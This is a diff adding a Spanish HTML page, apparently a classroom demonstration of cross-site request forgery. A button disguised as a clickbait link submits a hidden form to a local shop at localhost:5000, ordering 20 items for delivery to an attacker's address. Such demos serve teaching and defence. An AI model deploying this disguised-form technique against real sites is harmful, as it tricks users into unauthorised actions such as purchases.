@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+	<title>Pagina "inocente"</title>
+</head>
+<body>
+<style type="text/css">
+#submit {
+  background: none!important;
+  border: none;
+  color: blue;
+  text-decoration: underline;
+  cursor: pointer;
+}
+</style>
+  <h1>¡¡Quiero engañarte para que pinches en el formulario que parece un enlace!!</h1>
+    <p>
+    <form action="http://localhost:5000/comprar" method="POST" target="_blank">
+        <input type="hidden" name="num_items" value="20">
+        <input type="hidden" name="address" value="Hacker McCracker. Calle del atacante, 123. Gotham City">
+        <button type="submit" id="submit" value="Submit">Las frutas más saludables (¡la tercera te sorprenderá!)</button>
+    </form> 
+    </p>
+</body>  
+</html>
